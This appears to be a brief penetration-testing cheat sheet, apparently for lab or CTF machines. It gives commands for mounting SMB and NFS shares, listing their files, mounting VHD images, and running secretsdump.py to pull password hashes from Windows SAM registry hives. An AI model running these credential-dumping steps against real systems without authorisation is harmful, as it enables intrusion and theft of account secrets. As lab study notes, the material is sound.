
![image](https://user-images.githubusercontent.com/35967437/200789372-f622f2e0-21cc-41f0-969f-e28e017a29a3.png)

<h2> Mounting files </h2>
If you have smb access to shares you could try mount file share -- sudo mount -t cifs //10.10.10.134/backups /mnt -o user=,password= <br>
Then to list all files in the mount cd to /mnt and type -- find /mnt/ -type f <br>
to unmount -- umount /mnt <br>
<br>
Could also do the below for NFS ports<br>
showmount -e IP <br>
sudo mount -t nfs IP:/path/of/mount /mnt <br>
find /mnt/ -type f <br>
<br>
If you find vhd files in a mount, can use <br>
guestmount --add /path/to/vhd.vhd --inspector --ro /mnt2/   <br>
Try secretsdump.py on the SAM -- secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
